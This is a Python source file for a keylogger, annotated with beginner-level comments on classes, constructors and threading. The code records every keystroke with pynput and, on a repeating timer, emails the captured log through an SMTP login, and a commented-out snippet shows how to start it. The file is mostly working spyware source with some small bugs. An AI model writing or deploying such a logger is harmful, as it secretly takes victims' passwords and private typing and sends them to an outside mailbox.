#!/usr/share/python3

import pynput.keyboard          # pynput can listen for mouse and keyboard and log them as well as use them. Here we just want keyboard functionalities
#import pynput
import threading
import smtplib

#log = ""                       # declaring a variable named "log" as an empty variable (To make it global variable in further code)

class Keylogger:

    def __init__(self, time_interval, email, password):          # defining a constructor method
        self.log = "Keylogger started"                           # This is known as Attribute : To give a basic definition of both terms, class attributes are class variables that are inherited by every object of a class.
                                                # The value of class attributes remain the same for every new object.
        self.interval = time_interval           # Get the time interval
        self.email = email                      # Get the email address
        self.password = password                # Get the password of the email address

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        #global log                              # To specify python that this is a global variable
                                                 # Global variable is something that can be used in any function by calling it a global variable. 
                                                 # It's values can be accessed in any function where it is specified as a global variable.
        try:
            current_key =  str(key.char)         # .char will convert the values of key variable into characters
        except AttributeError:                   # Attribute error will occur when keys like space is pressed and python will not be able to convert it into characters
            if key == key.space:                 # If space key is detected, give a space in the text. This will just make the output more readable
                current_key = " "
            else:
                current_key =  " " + str(key) + " "     # Spaces is just to make the output readable
        self.append_to_log(current_key)

    def send_mail(self, email, password, message):

        server = smtplib.SMTP("smtp.google.com", 587)   # "smtp.google.com" is the server that will allows us to send mails. Google allows there servers to be used to send mails
                                                        # And this service works on port 587 in the server
        server.starttls()                               # Initiate a tls connection using the sever that has been created
        server.login(email, password)                   # Login to the server
        server.send_mail(email, email, message)         # server.send_mail(<from_mail_address>, <to_mail_address>, <message>) 
                                                        # Here I want to send the mail to myself so the <from_mail_address> and <to_mail_address> is the same
        server.quit()                                   # At last stop the server

    def report(self):
        #global log                                                       # call the global log variable
        self.send_mail(self.email, self.password, "\n\n" + self.log)      # Calling the send_mail() function                 
        self.log = ""                                                     # clear the log variable
        timer = threading.Timer(self.interval, self.report)               # timer is a object that contains the function of threading.Timer which will after every given interval call the given function
        timer.start()                                                     # Start the timer

    def start(self):
        keyboard_listner = pynput.keyboard.Listener(on_press=self.process_key_press)          # process_key_press is a callback function that will be called each time a key is pressed
        with keyboard_listner:
            self.report()
            keyboard_listner.join()                                                           # Start logging the keys (actually it is the syntax provided by the module documentation)

# Threading in python
# Theading in python allows us to execute two processes (threads) at one time
# In this particular program of keylogger, we want to send a mail in some specific intervals of time. Here, we are trapped about where to call the send_mail function
# We want that the program must run smoothly and in specific intervals of time, invoke the send mail function and again keep running the program

# Any function that calls itself is called a recursive function

# Object Oriented Programming
# Allows us to build classes 

# //// Classes ////
# Way of modeling program (blueprint).
# Logical group functions and data.
# >> Makes code more readable.
# >> More reusable.
# >> Seperate implementation from usage (encapsulation).
# >> Easier to extend.
# >> Easier to maintain.

# You can name the class anything you want but it's a common practice to name a class starting with a capital letter
# The functions that are defined inside a class are called method
# While defining a method, for example: def process_packet(self, packet) //// "self" must be the first arguement
# While calling any method inside a class, call it by specifinf "self.". For example: options = self.get_arguements()

# //// Constructor method ////
# The constructor method is a function inside a class that will get executed as soon as an object is defied with the class
# for example : //// sample program //// name of this current file is keylogger.py and example script is zlogger.py

# #!/usr/share/python3
# import keylogger          # calling the keylogger script that was written earlier
# my_keylogger = keylogger.Keylogger()        # my_keylogger is an object where keylogger was the script name and Keylogger was the class name
# my_keylogger.start()                        # my_keylogger has the instance of keylogger.Keylogger() and the start is the method that we are calling from the class

# with constructor method, as soon as the object is defined with the class (in this case my_keylogger), the method will automatically called and will be executed without manually calling it
# the name of the constructor method is always same : __init__(self):
